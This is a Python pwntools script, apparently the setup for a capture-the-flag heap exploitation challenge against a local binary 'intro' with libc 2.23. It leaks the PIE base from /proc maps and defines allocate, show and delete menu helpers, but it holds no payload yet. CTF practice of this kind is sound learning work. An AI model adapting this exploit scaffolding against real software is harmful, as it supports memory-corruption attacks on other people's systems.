from pwn import * 


elf = ELF("./intro")
libc = ELF("./libc-2.23.so") 
context.terminal = ['tmux', 'splitw', '-h'] 

def get_PIE(r): 
    with open("/proc/%d/maps" % (r.pid)) as f: 
        maps = f.readlines() 
    base = maps[0].split("-")[0] 
    return int(base, 16) 

if (args.GDB): 
    r = process('./intro')#, env={"LD_PRELOAD": "./libc-2.23.so"} ) 
    log.success("PIE base %s" % (hex(get_PIE(r))))
    gdb.attach(r) 
else: 
    r = process('./intro')# , env={"LD_PRELOAD": "./libc-2.23.so"} ) 
base = get_PIE(r) 
log.success("Storage array: %s" % hex(base + 0x00202060)) 

@atexception.register
def handler():
    log.error(r.recv()) 
with context.local(log_level = 'error'):
      atexception.register(handler)

def menu(): 
    r.recvuntil("> ") 
def alloc(index, size, data): 
    menu() 
    r.sendline(b'1') 
    r.recvline() 
    r.sendline(str(index).encode()) 
    r.recvline() 
    r.sendline(str(size).encode()) 
    r.recvline() 
    r.send(data)
def show(index): 
    menu() 
    r.sendline(b'2') 
    r.recvline() 
    r.sendline(str(index).encode()) 
    return r.recvuntil('1')[:-1] 
def delete(index): 
    menu() 
    r.sendline(b'3')
    r.recvline() 
    r.sendline(str(index).encode()) 




